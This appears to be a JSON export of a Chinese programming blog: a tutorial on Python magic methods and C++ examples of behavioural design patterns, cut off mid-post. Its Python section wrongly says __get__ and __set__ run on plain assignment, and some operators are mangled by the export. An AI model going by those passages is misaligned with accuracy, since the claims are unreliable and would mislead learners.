\u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__weakref__\u0026#39;]   我们可以看到许多默认的方法。比如每一个类都有一个默认的__init__方法作为其构造函数。而如果想定义自己的构造函数，就需要显式地对构造函数进行定义。\n下面结合实例来说明一些魔法函数的用处。\n基本 __new__(cls[,args...])\n一个对象实例化的时候所调用的第一个方法。\n__init__(self[, args...])\n默认的构造函数，用于类的初始化。\n 注：__init__和__new__的区别：\n在一般情况下，我们在构造类时调用的是__init__，但实际上第一个被调用的方法是__new__。以下代码为证：\n1 2 3 4 5 6 7 8 9  class Bar: def __new__(cls, num): print(\u0026#34;use __new__ method\u0026#34;) return super(Bar, cls).__new__(cls) def __init__(self, num): print(\u0026#34;use __init__ method\u0026#34;) self.num = num bar = Bar(1)   结果为：\n1 2  use __new__ method use __init__ method   一般情况下，我们放心使用__init__方法进行对象的构造即可，只需大致理解__new__和__init__的区别即可：\n__new__:创建对象时调用，会返回当前对象的一个实例\n__init__:创建完对象后调用，对当前对象的一些实例初始化，无返回值\n __str__(self)\n定义使用print()时的行为。\n__repr__(self)\n与str方法类似，但更面向开发者。如果一个类同时定义str()和repr()，那么会优先使用str()。\n 注：str和repr的返回值必须为str\n __call__(self[, args...])\n像函数一样调用类的实例。可以接参数。\n__get__(self)\n定义用对象为其他成员赋值的行为。\n__set__(self[,args...])\n定义为其他数据类型为对象赋值时的行为。\n__del__(self)\n默认的析构函数。\n代码实例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  class Foo: def __init__(self,num): self.num = num print(\u0026#34;constructor\u0026#34;) def __del__(self): print(\u0026#34;destructor\u0026#34;) def __repr__(self): return \u0026#34;the repr\u0026#34; def __call__(self, a): print(\u0026#34;__call__ is used, the value is {}\u0026#34;.format(a)) def __get__(self): return self.num def __set__(self,num): self.num = num foo = Foo(0) # __init__ print(foo) # __str__或__repr__ foo(1) # __call__ foo = 2 # __set__ num = foo # __get__ # 析构 print(num)   运算符重载 Python的类中定义了大量一元运算符、二元运算符、类型转换运算符等。此处不再一一赘述。\n   函数 功能     __lt__(self, other) 定义小于号的行为：x \u0026lt; y 调用 x.lt(y)   __le__(self, other) 定义小于等于号的行为：x \u0026lt;= y 调用 x.le(y)   __eq__(self, other) 定义等于号的行为：x ` y 调用 x.eq(y)   __ne__(self, other) 定义不等号的行为：x != y 调用 x.ne(y)   __gt__(self, other) 定义大于号的行为：x \u0026gt; y 调用 x.gt(y)   __ge__(self, other) 定义大于等于号的行为：x \u0026gt;= y 调用 x.ge(y)       __add__(self, other) 定义加法的行为：+   __sub__(self, other) 定义减法的行为：-   __mul__(self, other) 定义乘法的行为：*   __truediv__(self, other) 定义真除法的行为：/   __floordiv__(self, other) 定义整数除法的行为：//   __mod__(self, other) 定义取模算法的行为：%   __divmod__(self, other) 定义当被 divmod() 调用时的行为   __pow__(self, other[, modulo]) 定义当被 power() 调用或 ` 运算时的行为   __lshift__(self, other) 定义按位左移位的行为：\u0026laquo;   __rshift__(self, other) 定义按位右移位的行为：\u0026raquo;   __and__(self, other) 定义按位与操作的行为：\u0026amp;   __xor__(self, other) 定义按位异或操作的行为：^   __or__(self, other) 定义按位或操作的行为：|       __radd__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用）   __rsub__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用）   __rmul__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用）   __rtruediv__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用）   __rfloordiv__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用）   __rmod__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用）   __rdivmod__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用）   __rpow__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用）   __rlshift__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用）   __rrshift__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用）   __rand__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用）   __rxor__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用）   __ror__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用）       __iadd__(self, other) 定义赋值加法的行为：+=   __isub__(self, other) 定义赋值减法的行为：-=   __imul__(self, other) 定义赋值乘法的行为：*=   __itruediv__(self, other) 定义赋值真除法的行为：/=   __ifloordiv__(self, other) 定义赋值整数除法的行为：//=   __imod__(self, other) 定义赋值取模算法的行为：%=   __ipow__(self, other[, modulo]) 定义赋值幂运算的行为：`=   __ilshift__(self, other) 定义赋值按位左移位的行为：\u0026laquo;=   __irshift__(self, other) 定义赋值按位右移位的行为：\u0026raquo;=   __iand__(self, other) 定义赋值按位与操作的行为：\u0026amp;=   __ixor__(self, other) 定义赋值按位异或操作的行为：^=   __ior__(self, other) 定义赋值按位或操作的行为：|=       __pos__(self) 定义正号的行为：+x   __neg__(self) 定义负号的行为：-x   __abs__(self) 定义当被 abs() 调用时的行为   __invert__(self) 定义按位求反的行为：~x       __complex__(self) 定义当被 complex() 调用时的行为（需要返回恰当的值）   __int__(self) 定义当被 int() 调用时的行为（需要返回恰当的值）   __float__(self) 定义当被 float() 调用时的行为（需要返回恰当的值）   __round__(self[, n]) 定义当被 round() 调用时的行为（需要返回恰当的值）    容器 假设对象名为foo:\n__len__(self)\n定义调用len()时的返回值。(必须为int)\n__getitem__(self,index)\n定义调用foo[index]的返回值。\n__setitem__(self,index,value)\n定义为foo[index]赋值为value的行为。\n__delitem__(self, key)\n删除指定索引对应的元素。\n__contains__(self, item)\n判断序列是否包含指定元素。\n迭代 __iter__(self)\n生成迭代对象时调用，返回值必须是对象自己。\n__next__(self)\n每一次for循环都调用该方法。\n如果一个类实现了iter()和next()方法，那么就认为它是一个可迭代对象。\n以下用一个简单的实例(简单的dataloader)说明上述函数的用法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  class Dataloader: def __init__(self,picList): self.picList = picList self.index = -1 def __len__(self): return len(self.picList) def __getitem__(self,index): return self.picList[index] def __setitem__(self,index,value): self.picList[index] = value def __delitem__(self,index): print(\u0026#34;{}will be deleted\u0026#34;.format(self.picList[index])) del(self.picList[index]) def __contains__(self,name): return self.picList.__contains__(name) def __iter__(self): return self def __next__(self): self.index+=1 if(self.index\u0026lt;len(self)): return self.picList[self.index] else: raise StopIteration if __name__ ` \u0026#39;__main__\u0026#39;: picList = [\u0026#39;cat.png\u0026#39;,\u0026#39;dog.png\u0026#39;,\u0026#39;sheep.png\u0026#39;,\u0026#39;pig.png\u0026#39;] dataloader = Dataloader(picList) # __len__ print(len(dataloader)) # __getitem__ pic1 = dataloader[2] print(pic1) # __setitem__ dataloader[2] = \u0026#39;horse.png\u0026#39; # __contains__ print(\u0026#39;horse.png\u0026#39; in dataloader) # __delitem__ del(dataloader[2]) print(len(dataloader)) # __iter__和__next__ for pic in dataloader: print(pic)   回头再看开头的那个pytorch程序，是不是就没那么难了呢？\n后记 实际上Python的魔法函数远不止这些。感兴趣的读者可以参阅https://rszalski.github.io/magicmethods/\n","date":"2021-10-11T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/programming/python-magic-fuction/","title":"Python Magic Function"},{"content":"1.责任链模式 避免将一个请求的发送者和接收者耦合在一起，让多个对象都有机会处理请求。将接收请求的对象连接成一条链，并且沿着这条链传递请求，直到有一个对象能够处理它为止。\n链上的每一个对象都是请求的处理者，客户端要做的仅仅是发送请求，不需要关心请求的处理细节过程。\n职责链模式将请求者和请求的接收者解耦。\n以下以“副经理和经理处理资金”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91  #include\u0026lt;iostream\u0026gt;#include\u0026lt;string\u0026gt;#include\u0026lt;vector\u0026gt; // 请求 class Fund { public: Fund(int account) { this-\u0026gt;account = account; } int GetAccount()const { return account; } private: int account; }; // 抽象处理者 class Approver { public: Approver(){} virtual ~Approver(){} // 设置责任链的上级  void setSuperior(Approver *iSuperior) { this-\u0026gt;superior = iSuperior; } // 处理请求  virtual void handleRequest(Fund*) = 0; protected: // 处理者的“上级”，此处较像链表结构  Approver *superior; }; // 具体处理者 class ViceManager:public Approver { public: ViceManager(){} void handleRequest(Fund* fund) { if(fund-\u0026gt;GetAccount()\u0026lt;100) { std::cout\u0026lt;\u0026lt;\u0026#34;The fund has been disposed by vice manager,$\u0026#34;\u0026lt;\u0026lt;fund-\u0026gt;GetAccount()\u0026lt;\u0026lt;std::endl; } else { std::cout\u0026lt;\u0026lt;\u0026#34;Deliver to manager\u0026#34;\u0026lt;\u0026lt;std::endl; superior-\u0026gt;handleRequest(fund); } } }; class Manager:public Approver { public: Manager(){} void handleRequest(Fund* fund) { std::cout\u0026lt;\u0026lt;\u0026#34;The fund has been disposed by manager,$\u0026#34;\u0026lt;\u0026lt;fund-\u0026gt;GetAccount()\u0026lt;\u0026lt;std::endl; } }; int main() { Approver *viceManager,*manager; viceManager = new ViceManager(); manager = new Manager(); // 建立责任链，注意要遵循一定的逻辑顺序  viceManager-\u0026gt;setSuperior(manager); // 统一委派给低层处理  Fund *fund = new Fund(5); viceManager-\u0026gt;handleRequest(fund); std::cout\u0026lt;\u0026lt;std::endl; fund = new Fund(500); viceManager-\u0026gt;handleRequest(fund); delete viceManager; delete manager; delete fund; }   1 2 3 4 5 6  结果： The fund has been disposed by vice manager,$5 Deliver to manager The fund has been disposed by manager,$500   2.命令模式 定义 将一个请求封装为一个对象，从而可用不同的请求对客户进行参数化。\n内含抽象命令类，具体命令类，调用者和接收者。\n以下以“控制电视和空调的遥控器”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143  #include\u0026lt;iostream\u0026gt;#include\u0026lt;string\u0026gt; // 接收者 class TV { public: TV () { isOpen = false; } void on() { isOpen = true; std::cout\u0026lt;\u0026lt;\u0026#34;TV on\u0026#34;\u0026lt;\u0026lt;std::endl; } void off() { isOpen = false; std::cout\u0026lt;\u0026lt;\u0026#34;TV off\u0026#34;\u0026lt;\u0026lt;std::endl; } bool getState() { return isOpen; } private: bool isOpen; }; // 接收者 class AC { public: AC () { isOpen = false; } void on() { isOpen = true; std::cout\u0026lt;\u0026lt;\u0026#34;AC on\u0026#34;\u0026lt;\u0026lt;std::endl; } void off() { isOpen = false; std::cout\u0026lt;\u0026lt;\u0026#34;AC off\u0026#34;\u0026lt;\u0026lt;std::endl; } bool getState() { return isOpen; } private: bool isOpen; }; // 抽象命令 class Command { public: Command(){} virtual ~Command(){} virtual void execute() = 0; }; // 具体命令 class TVCommand:public Command { public: TVCommand() { tv = new TV(); } ~TVCommand() { delete tv; } void execute() override { if(tv-\u0026gt;getState()) { tv-\u0026gt;off(); } else { tv-\u0026gt;on(); } } private: TV *tv; }; // 具体命令 class ACCommand:public Command { public: ACCommand() { ac = new AC(); } ~ACCommand() { delete ac; } void execute() override { if(ac-\u0026gt;getState()) { ac-\u0026gt;off(); } else { ac-\u0026gt;on(); } } private: AC *ac; }; // 调用者 class RemoteControl { public: RemoteControl(){} void set(Command *command) { this-\u0026gt;command = command; } void execute() { command-\u0026gt;execute(); } private: Command *command; }; int main() { RemoteControl *remoteControl = new RemoteControl(); Command *tvCmd = new TVCommand(); remoteControl-\u0026gt;set(tvCmd); remoteControl-\u0026gt;execute(); remoteControl-\u0026gt;execute(); }    结果：\nTV on TV off\n 3.迭代器模式 定义 提供一种方法顺序访问一个聚合对象中的各个元素，而又不暴露该对象的内部表示。通过引入迭代器，可以将数据的遍历功能从聚合对象中分离出来，这样一来，聚合对象只需负责存储数据，而迭代器对象负责遍历数据。\n包含抽象迭代器、具体迭代器、抽象容器、具体容器。\n以下以“CD机”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75  #include\u0026lt;iostream\u0026gt;#include\u0026lt;string\u0026gt;#include\u0026lt;vector\u0026gt; class Iterator; // 容器类 class CD { public: CD(std::vector\u0026lt;std::string\u0026gt; CDlist) { this-\u0026gt;CDlist = CDlist; } void play(int i) { std::cout\u0026lt;\u0026lt;CDlist[i]\u0026lt;\u0026lt;std::endl; } int getLen() { return CDlist.size(); } private: std::vector\u0026lt;std::string\u0026gt; CDlist; }; // 迭代器类 class Iterator { public: Iterator(){} void set(CD* cd) { this-\u0026gt;cd = cd; this-\u0026gt;len = cd-\u0026gt;getLen(); } void first() { cursor = 0; } void last() { cursor = len - 1; } void next() { cursor++; } void play() { cd-\u0026gt;play(cursor); } private: int cursor; int len; CD* cd; }; int main() { std::vector\u0026lt;std::string\u0026gt; CDlist = { \u0026#34;lost rivers\u0026#34;,\u0026#34;bad apple\u0026#34;,\u0026#34;the new island\u0026#34; }; CD *cd = new CD(CDlist); Iterator *it = new Iterator(); it-\u0026gt;set(cd); it-\u0026gt;first(); it-\u0026gt;play(); it-\u0026gt;next(); it-\u0026gt;play(); it-\u0026gt;last(); it-\u0026gt;play(); delete cd; delete it; }    结果：\nlost rivers bad apple the new island\n 4.中介者模式 定义 定义一个对象来封装一系列对象的交互。中介者模式使各个对象之间不需要显示地相互引用，从而使其耦合松散，而且用户可以独立地改变它们之间的交互。\n通过中介者，对象之间的多对多关系就简化了相对更简单的一对多关系。中介者在结构上起中转作用，在行为上起协调作用。\n包含抽象中介者、具体中介者、抽象同事类、具体同事类。\n以下以“二手车平台中间商”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154  #include \u0026lt;iostream\u0026gt;#include \u0026lt;string\u0026gt;#include \u0026lt;vector\u0026gt; enum class PersonType { CUSTOMER, MERCHANT }; class Person; class Mediator { public: Mediator(){} virtual ~Mediator(){} virtual void operation(Person*) = 0; virtual void registerMethod(Person*) = 0; }; // 抽象同事类 class Person { public: Person(){} virtual ~Person(){} PersonType getType() { return type; } void setMediator(Mediator* mediator) { this-\u0026gt;mediator = mediator; } virtual void ask() = 0; virtual void answer() = 0; protected: PersonType type; Mediator* mediator; }; class Merchant:public Person { public: Merchant(std::string name, int price) { this-\u0026gt;name = name; this-\u0026gt;price = price; this-\u0026gt;type = PersonType::MERCHANT; } void ask()override { std::cout\u0026lt;\u0026lt;\u0026#34;all customer info: \u0026#34;\u0026lt;\u0026lt;std::endl; this-\u0026gt;mediator-\u0026gt;operation(this); } void answer()override { std::cout\u0026lt;\u0026lt;\u0026#34;name: \u0026#34;\u0026lt;\u0026lt;name\u0026lt;\u0026lt;\u0026#34; price: \u0026#34;\u0026lt;\u0026lt;price\u0026lt;\u0026lt;std::endl; } private: std::string name; int price; }; class Customer:public Person { public: Customer(std::string name) { this-\u0026gt;name = name; this-\u0026gt;type = PersonType::CUSTOMER; } void ask()override { std::cout\u0026lt;\u0026lt;\u0026#34;all merchant info: \u0026#34;\u0026lt;\u0026lt;std::endl; this-\u0026gt;mediator-\u0026gt;operation(this); } void answer()override { std::cout\u0026lt;\u0026lt;\u0026#34;name: \u0026#34;\u0026lt;\u0026lt;name\u0026lt;\u0026lt;std::endl; } private: std::string name; }; class ConcreteMediator:public Mediator { public: ConcreteMediator(){} void registerMethod(Person *person) override { if(person-\u0026gt;getType() == PersonType::CUSTOMER) { customerList.push_back((Customer*)person); } else if(person-\u0026gt;getType() == PersonType::MERCHANT) { merchantList.push_back((Merchant*)person); } } void operation(Person* person) override { if(person-\u0026gt;getType() == PersonType::CUSTOMER) { for(int i = 0;i\u0026lt;merchantList.size();i++) { merchantList[i]-\u0026gt;answer(); } } else if(person-\u0026gt;getType() == PersonType::MERCHANT) { for(int i = 0;i\u0026lt;customerList.size();i++) { customerList[i]-\u0026gt;answer(); } } } private: std::vector\u0026lt;Merchant*\u0026gt; merchantList; std::vector\u0026lt;Customer*\u0026gt; customerList; }; int main() { Mediator *mediator = new ConcreteMediator(); Person *merchant1 = new Merchant(\u0026#34;foo company\u0026#34;,1000); Person *merchant2 = new Merchant(\u0026#34;bar company\u0026#34;,500); merchant1-\u0026gt;setMediator(mediator); merchant2-\u0026gt;setMediator(mediator); Person *customer1 = new Customer(\u0026#34;foo\u0026#34;); Person *customer2 = new Customer(\u0026#34;bar\u0026#34;); customer1-\u0026gt;setMediator(mediator); customer2-\u0026gt;setMediator(mediator); mediator-\u0026gt;registerMethod(merchant1); mediator-\u0026gt;registerMethod(merchant2); mediator-\u0026gt;registerMethod(customer1); mediator-\u0026gt;registerMethod(customer2); merchant1-\u0026gt;ask(); customer2-\u0026gt;ask(); delete mediator; delete merchant1; delete merchant2; delete customer1; delete customer2; }    结果：\nall customer info: name: foo name: bar all merchant info: name: foo company price: 1000 name: bar company price: 500\n 5.备忘录模式 定义 在不破坏封装的前提下捕获一个对象的内部状态，并在该对象之外保存这个状态，这样可以在以后将对象恢复到原先保存的状态。\n包含原发器、备忘录和管理者。\n以下以“自制git”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152  #include \u0026lt;iostream\u0026gt;#include \u0026lt;string\u0026gt;#include \u0026lt;vector\u0026gt; // 备忘录 class Memento { public: Memento() {} Memento(int version, std::string date, std::string message) { this-\u0026gt;version = version; this-\u0026gt;date = date; this-\u0026gt;message = message; } void setVersion(int version) { this-\u0026gt;version = version; } void setDate(std::string date) { this-\u0026gt;date = date; } void setMessage(std::string message) { this-\u0026gt;message = message; } int getVersion() { return version; } std::string getDate() { return date; } std::string getMessage() { return message; } private: int version; std::string date; std::string message; }; // 原生器 class Originator { public: Originator(int version, std::string date, std::string message) { this-\u0026gt;version = version; this-\u0026gt;date = date; this-\u0026gt;message = message; } void setVersion(int version) { this-\u0026gt;version = version; } void setDate(std::string date) { this-\u0026gt;date = date; } void setMessage(std::string message) { this-\u0026gt;message = message; } int getVersion() { return version; } std::string getDate() { return date; } std::string getMessage() { return message; } Memento *save() { return new Memento(version, date, message); } void reset(Memento* memento) { setVersion(memento-\u0026gt;getVersion()); setDate(memento-\u0026gt;getDate()); setMessage(memento-\u0026gt;getMessage()); } private: int version; std::string date; std::string message; }; // 管理者 class Git { public: Git(Originator* originator) { this-\u0026gt;originator = originator; } void commit() { Memento *m = originator-\u0026gt;save(); std::cout \u0026lt;\u0026lt; \u0026#34;commit: \u0026#34; \u0026lt;\u0026lt; m-\u0026gt;getVersion() \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; m-\u0026gt;getDate() \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; m-\u0026gt;getMessage() \u0026lt;\u0026lt; std::endl; mementoList.push_back(m); } void reset(int index) { mementoList.erase(mementoList.begin() + mementoList.size() - index, mementoList.end()); originator-\u0026gt;reset(mementoList[mementoList.size() - 1]); } void log() { for (int i = 0; i \u0026lt; mementoList.size(); i++) { std::cout \u0026lt;\u0026lt; mementoList[i]-\u0026gt;getVersion() \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; mementoList[i]-\u0026gt;getDate() \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; mementoList[i]-\u0026gt;getMessage() \u0026lt;\u0026lt; std::endl; } } private: std::vector\u0026lt;Memento *\u0026gt; mementoList; Originator* originator; }; int main() { Originator* originator = new Originator(1,\u0026#34;2021-08-27\u0026#34;,\u0026#34;Initial Commit\u0026#34;); Git *git = new Git(originator); git-\u0026gt;commit(); originator-\u0026gt;setVersion(2); originator-\u0026gt;setDate(\u0026#34;2021-08-28\u0026#34;); originator-\u0026gt;setMessage(\u0026#34;add a function\u0026#34;); git-\u0026gt;commit(); originator-\u0026gt;setVersion(3); originator-\u0026gt;setDate(\u0026#34;2021-08-29\u0026#34;); originator-\u0026gt;setMessage(\u0026#34;fix a bug\u0026#34;); git-\u0026gt;commit(); std::cout\u0026lt;\u0026lt;std::endl; git-\u0026gt;log(); git-\u0026gt;reset(1); std::cout\u0026lt;\u0026lt;std::endl; git-\u0026gt;log(); }    结果：\ncommit: 1 2021-08-27 Initial Commit commit: 2 2021-08-28 add a function commit: 3 2021-08-29 fix a bug\n1 2021-08-27 Initial Commit 2 2021-08-28 add a function 3 2021-08-29 fix a bug\n1 2021-08-27 Initial Commit 2 2021-08-28 add a function\n 6.观察者模式 定义 定义对象之间的一种一对多的依赖关系，使得每当一个对象状态发生改变时，其相关依赖对象都得到通知并被自动更新。\n在该模式中，发生改变的对象称为“观察目标”，被通知的对象称为“观察者”。一个观察目标可以有很多个观察者。\n观察者和观察目标相互引用。\n以下以“软件的发布者与订阅者”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89  #include\u0026lt;iostream\u0026gt;#include\u0026lt;string\u0026gt;#include\u0026lt;list\u0026gt; // 抽象观察者 class Observer { public: virtual void update(std::string info) = 0; virtual ~Observer(){} }; // 抽象目标 class Subject { public: virtual void attach(Observer* obs) = 0; virtual void detach(Observer* obs) = 0; // 声明通知方法  virtual void notify() = 0; virtual void CreateMessage(std::string) = 0; virtual ~Subject(){} protected: // 观察者列表  std::list\u0026lt;Observer*\u0026gt;obsList; std::string info; }; // 具体观察者 class Subscriber:public Observer { public: Subscriber(Subject *s,std::string name):subject(s),name(name) { this-\u0026gt;subject-\u0026gt;attach(this); } void update(std::string info)override { this-\u0026gt;info = info; std::cout\u0026lt;\u0026lt;name\u0026lt;\u0026lt;\u0026#39;:\u0026#39;\u0026lt;\u0026lt;\u0026#34;a new message-\u0026gt;\u0026#34;\u0026lt;\u0026lt;this-\u0026gt;info\u0026lt;\u0026lt;std::endl; } private: Subject* subject; std::string name; std::string info; }; // 具体目标 class Publisher :public Subject { public: void attach(Observer* obs) override { obsList.push_back(obs); } void detach(Observer* obs) override { obsList.remove(obs); } void CreateMessage(std::string info) override { this-\u0026gt;info = info; std::cout \u0026lt;\u0026lt; \u0026#34;A new info was released:\u0026#34; \u0026lt;\u0026lt; info \u0026lt;\u0026lt; std::endl; } // 实现通知方法  void notify()override { for (auto item:obsList) { item-\u0026gt;update(info); } } }; int main() { Subject *publisher = new Publisher(); Observer *subscriber1 = new Subscriber(publisher,\u0026#34;Alice\u0026#34;); Observer *subscriber2 = new Subscriber(publisher,\u0026#34;Bob\u0026#34;); publisher-\u0026gt;CreateMessage(\u0026#34;a new edition has been published\u0026#34;); publisher-\u0026gt;notify(); std::cout\u0026lt;\u0026lt;std::endl; Observer *subscriber3 = new Subscriber(publisher,\u0026#34;Carol\u0026#34;); publisher-\u0026gt;CreateMessage(\u0026#34;a bug has been fixed\u0026#34;); publisher-\u0026gt;notify(); return 0; }    结果：\nA new info was released:a new edition has been published Alice:a new message-\u0026gt;a new edition has been published Bob:a new message-\u0026gt;a new edition has been published\nA new info was released:a bug has been fixed Alice:a new message-\u0026gt;a bug has been fixed Bob:a new message-\u0026gt;a bug has been fixed Carol:a new message-\u0026gt;a bug has been fixed\n 7.状态模式 定义 状态模式将一个对象的状态从对象中分离出来，封装到专门的状态类中，使得对象状态可以灵活变化。\n包含上下文类、抽象状态类和具体状态类。\n以下以“斗地主身份设置”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70  #include \u0026lt;iostream\u0026gt; class Context; // 抽象状态类 class State { protected: Context *context; public: State(){} virtual ~State(){} void set(Context* context) { this-\u0026gt;context = context; } virtual void handle() = 0; }; // 具体状态类 class ConcreteState1 :public State { public: void handle()override { std::cout\u0026lt;\u0026lt;\u0026#34;Farmer: I have 17 cards\u0026#34;\u0026lt;\u0026lt;std::endl; } }; // 具体状态类 class ConcreteState2 :public State { public: void handle()override { std::cout\u0026lt;\u0026lt;\u0026#34;Landlord: I have 20 cards\u0026#34;\u0026lt;\u0026lt;std::endl; } }; // 上下文类 class Context { private: State *state; public: Context(){} void set(State* state) { this-\u0026gt;state = state; } void request() { this-\u0026gt;state-\u0026gt;handle(); } }; int main() { Context *context = new Context(); State* state= new ConcreteState1(); context-\u0026gt;set(state); context-\u0026gt;request(); state = new ConcreteState2(); context-\u0026gt;set(state); context-\u0026gt;request(); delete context; delete state; }    结果：\nFarmer: I have 17 cards Landlord: I have 20 cards\n 8.解释器模式 定义 给定一个语言，定义它的文法的一种表示，并定义一个解释器，这个解释器使用该表示来解释语言中的句子。\n解释器模式描述了如何为简单的语言定义一个文法，如何在该语言中表示一个句子，以及如何解释这些句子。\n包含抽象表达式、终结符表达式、非终结符表达式、上下文类。\n以下以“文字加减法处理”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111  #include\u0026lt;iostream\u0026gt;#include\u0026lt;string\u0026gt;#include\u0026lt;regex\u0026gt; std::regex re(\u0026#34;(.*)\\\\(.*)\\\\(.*)\u0026#34;); std::smatch base_match; // 抽象表达式 class AbstractExpression { public: AbstractExpression(){} virtual ~AbstractExpression(){} virtual char interpret() = 0; }; // 具体表达式：数值 class Value:public AbstractExpression { public: Value(){} Value(std::string value) { this-\u0026gt;value = std::atoi(value.c_str()); } char interpret()override { return value; } private: int value; }; // 具体表达式：运算符 class Operator:public AbstractExpression { public: Operator(){} Operator(std::string op) { this-\u0026gt;op = op; } char interpret()override { if(op==\u0026#34;plus\u0026#34;) { return \u0026#39;+\u0026#39;; } else if(op==\u0026#34;minus\u0026#34;) { return \u0026#39;-\u0026#39;; } return 0; } private: std::string op; }; // 上下文类 class Context { public: Context(){} void set(std::string input) { this-\u0026gt;input = input; } void handle() { AbstractExpression *left; AbstractExpression *right; AbstractExpression *op; if (std::regex_match(input, base_match, re)) { left = new Value(base_match[1].str()); op = new Operator(base_match[2].str()); right = new Value(base_match[3].str()); if(op-\u0026gt;interpret() == \u0026#39;+\u0026#39;) { result = left-\u0026gt;interpret()+right-\u0026gt;interpret(); } else if(op-\u0026gt;interpret() == \u0026#39;-\u0026#39;) { result = left-\u0026gt;interpret()-right-\u0026gt;interpret(); } std::cout\u0026lt;\u0026lt;result\u0026lt;\u0026lt;std::endl; delete left; delete op; delete right; } } private: std::string input; int result; }; int main() { Context *context = new Context(); std::string input1 = \u0026#34;1 plus 1\u0026#34;; std::string input2 = \u0026#34;4 minus 5\u0026#34;; context-\u0026gt;set(input1); context-\u0026gt;handle(); context-\u0026gt;set(input2); context-\u0026gt;handle(); delete context; }    结果：\n2 -1\n 9.策略模式 定义 定义一系列算法，将每一个算法封装起来，并让它们可以相互替换。策略模式让算法可以独立于使用它的客户而变化。\n包含上下文类、抽象策略类、具体策略类。\n以下以“面向对象的加减法”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 